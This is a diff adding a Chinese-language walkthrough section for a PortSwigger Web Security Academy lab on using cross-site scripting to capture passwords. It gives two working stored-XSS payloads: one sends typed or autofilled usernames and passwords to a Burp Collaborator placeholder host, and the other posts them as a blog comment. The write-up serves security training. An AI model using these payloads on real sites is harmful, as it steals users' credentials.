@@ -390,3 +390,49 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+o
 直接`alert`也行，不过官方也说了，这样不够隐蔽。
 
 最后替换Cookies打开My Account即可。
+
+## 23. Exploiting cross-site scripting to capture passwords
+
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+	method:'POST',
+	mode: 'no-cors',
+	body:username.value+':'+this.value
+});">
+```
+
+基本思路跟#22一样，就是通过`fetch`来请求Burp Collector获取信息，但是构造`input`是我没有想到的。
+
+想要触发这个Payload，就需要在`input`中输入用户名和密码，这有两种可能：一为钓鱼，二为利用浏览器自动填充的特性。
+
+在Community Solutions中，还有一种其他的解法，直接将用户名密码回显在评论区。
+
+```html
+<input type="text" name="username" id="username">
+<input type="password" name="password" onchange="hax()">
+
+<script>
+function hax() {
+  var token = document.getElementsByName("csrf")[0].value;
+  var username = document.getElementsByName("username")[0].value;
+  var password = document.getElementsByName("password")[0].value;
+  
+  var data = new FormData();
+  data.append("csrf", token);
+  data.append("postID", 1);
+  data.append("comment", `${username}:${password}`);
+  data.append("name", "victim");
+  data.append("email", "victim@portswigger.net");
+  data.append("website", "http://portswigger.net");
+  
+  fetch("/post/comment", {
+    method: "POST",
+    mode: "no-cors",
+    body: data
+  });
+}
+</script>
+```
+
+这样会在`postID`为`1`的文章评论中找到用户名和密码。但没有成功复现，通过debug会发现，`fetch`会返回`400`，可能是官方为了减少非预期解，毕竟是靶场。
